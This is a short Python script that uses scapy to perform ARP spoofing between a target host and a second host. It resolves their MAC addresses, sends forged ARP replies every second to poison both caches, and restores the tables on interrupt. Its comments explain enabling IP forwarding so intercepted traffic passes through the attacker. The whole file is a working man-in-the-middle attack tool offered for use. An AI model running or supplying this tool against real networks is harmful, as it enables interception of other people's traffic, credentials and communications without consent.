#spoofed_ip is the ip that we are going to pretend to be
#target_ip is the ip that we are going to send the arp response to
#For packet forwarding do --> echo 1 >  /proc/sys/net/ipv4/ip_forward (this channges the value from 0 to 1)
#And this needs administrative permission to run
#You can check with wireshark that the attacker has a duplicate mac


import scapy.all as scapy
from time import sleep
import argparse,threading

def main():
    parser = argparse.ArgumentParser(description="This is a simple arp spoofing tool")
    parser.add_argument('-t','--target',help="The IP address of the target machine")
    parser.add_argument('-s','--spoof',help="The IP if the spoof machine")
    options = parser.parse_args()
    target_ip = options.target
    spoof_ip = options.spoof
    target_mac = mac_extractor(target_ip)
    spoof_mac = mac_extractor(spoof_ip)
    print(f"Spoofing {target_ip} and {spoof_ip}.....")
    try:
        while True:
            spoofer(target_ip,target_mac,spoof_ip)
            spoofer(spoof_ip,spoof_mac,target_ip)
            sleep(1)
    except KeyboardInterrupt:
        print("\n'Ctrl c' detected stopping the function.\nRestoring the arp table now")
        restore_mac(target_ip,target_mac,spoof_ip,spoof_mac)
        restore_mac(spoof_ip,spoof_mac,target_ip,target_mac)
        exit(0)

def mac_extractor(ip):
    arp_packet = scapy.ARP(pdst=ip)
    ethernet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    full_packet = ethernet/arp_packet
    answered = scapy.srp(full_packet,verbose=False,timeout=1)[0] # first element i.e answered
    mac = answered[0][1].hwsrc
    return mac

def restore_mac(target_ip,target_mac,spoof_ip,spoof_mac):
    arp_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip,hwsrc=spoof_mac)
    scapy.send(arp_packet,verbose=False)

def spoofer(target1_ip,target1_mac,target2_ip):
    arp_packet = scapy.ARP(op=2,pdst=target1_ip,hwdst=target1_mac,psrc=target2_ip)
    scapy.send(arp_packet,verbose=False)
    

if __name__ == '__main__':
    main()
